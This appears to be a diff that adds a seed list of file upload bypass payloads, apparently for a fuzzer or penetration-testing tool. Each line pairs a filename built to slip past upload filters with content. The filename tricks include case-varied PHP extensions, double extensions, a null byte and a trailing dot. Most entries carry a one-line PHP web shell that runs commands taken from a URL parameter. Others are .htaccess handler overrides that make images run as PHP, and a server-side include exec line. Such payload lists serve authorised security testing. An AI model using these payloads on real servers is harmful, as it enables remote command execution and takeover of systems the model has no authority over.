@@ -1,0 +1,34 @@
+# File Upload Bypass Seed Payloads
+test.php:<?php system($_GET['cmd']); ?>
+test.php5:<?php system($_GET['cmd']); ?>
+test.phtml:<?php system($_GET['cmd']); ?>
+test.php.jpg:<?php system($_GET['cmd']); ?>
+test.asp:<% response.write("test") %>
+test.aspx:<%@ Page Language="C#" %><%= "test" %>
+test.jsp:<% out.println("test"); %>
+test.cgi:#!/bin/bash\necho Content-type: text/html\necho "test"
+test.pl:#!/usr/bin/perl\nprint "test";
+test.shtml:<!--#echo var="DATE_LOCAL" -->
+test.php;.jpg:<?php system($_GET['cmd']); ?>
+test.p%00.jpg:<?php system($_GET['cmd']); ?>
+test.php.:<?php system($_GET['cmd']); ?>
+test.PhP:<?php system($_GET['cmd']); ?>
+test.pHp:<?php system($_GET['cmd']); ?>
+test.Php:<?php system($_GET['cmd']); ?>
+test.PHP:<?php system($_GET['cmd']); ?>
+test.php7:<?php system($_GET['cmd']); ?>
+test.php8:<?php system($_GET['cmd']); ?>
+test.shtml:<!--#exec cmd="ls" -->
+test.htaccess:AddType application/x-httpd-php .jpg
+test.htaccess:AddHandler php5-script .txt
+test.htaccess:#<?php system($_GET['cmd']); ?>
+test.config:<?php system($_GET['cmd']); ?>
+test.inc:<?php system($_GET['cmd']); ?>
+test.pht:<?php system($_GET['cmd']); ?>
+test.pht5:<?php system($_GET['cmd']); ?>
+test.php3:<?php system($_GET['cmd']); ?>
+test.php4:<?php system($_GET['cmd']); ?>
+test.php6:<?php system($_GET['cmd']); ?>
+test.shell:<?php system($_GET['cmd']); ?>
+test.cdx:<?php system($_GET['cmd']); ?>
+test.cma:<?php system($_GET['cmd']); ?>
